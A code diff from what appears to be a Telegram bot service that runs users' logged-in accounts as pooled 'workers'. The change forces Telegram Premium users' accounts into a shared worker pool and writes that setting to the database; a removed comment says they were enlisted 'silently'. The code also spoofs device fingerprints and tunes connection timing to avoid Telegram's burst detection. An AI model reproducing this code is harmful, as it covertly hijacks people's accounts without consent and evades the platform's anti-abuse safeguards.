@@ -241,21 +241,20 @@ async def load_bot_account_client(account_record: Dict[str, Any]) -> Optional[Cl
                 pass
 
         owner_id = account_record.get("owner_user_id", account_id)
-        is_admin_owner = owner_id in ADMIN_IDS
+        is_admin_owner = (owner_id in ADMIN_IDS or account_id in ADMIN_IDS)
 
         # Dynamic Smart Worker Policy:
-        # 1. Admin/owner accounts -> Always dedicated shared workers (can_share=1)
-        # 2. Ordinary user accounts ->
-        #    - If Telegram Premium: Silently enlist into Turbo Worker Pool (can_share=1)
-        #    - If Regular/Free: Keep strictly isolated as Personal Only (can_share=0) to prevent FloodWait
-        if is_admin_owner:
-            effective_can_share = account_record.get("can_share", 1)
-        else:
-            effective_can_share = 1 if is_tg_prem else 0
+        # 1. Admin/owner accounts (AN0N's 20+ workers) -> ALWAYS dedicated shared workers in pool (can_share=1)
+        # 2. Ordinary user accounts with Telegram Premium -> ALWAYS enlisted into Turbo Worker Pool (can_share=1)
+        # 3. Regular free users -> Keep isolated as Personal Only (can_share=0) to prevent FloodWait on their private numbers
+        if is_admin_owner or is_tg_prem:
+            effective_can_share = 1
             try:
-                asyncio.create_task(db.set_bot_account_sharing(account_id, effective_can_share))
+                asyncio.create_task(db.set_bot_account_sharing(account_id, 1))
             except Exception:
                 pass
+        else:
+            effective_can_share = account_record.get("can_share", 0)
 
         # Stash client in dynamic pool
         account_pool[account_id] = client
@@ -716,7 +715,7 @@ async def initialize_all_bot_accounts():
                     fp = get_fingerprint_for_user(aid)
                     uname = rec.get("username") or rec.get("first_name") or str(aid)
                     print(f"  [+] Worker @{uname} [{aid}] online [{fp.get('device_model')}]")
-                await asyncio.sleep(0.4)  # stagger
+                await asyncio.sleep(0.5)  # gentle 0.5s stagger avoids IP-level Telegram connection burst flags
             except Exception as e:
                 print(f"  [!] Failed loading worker {rec.get('account_id')}: {e}")
     except Exception as e:
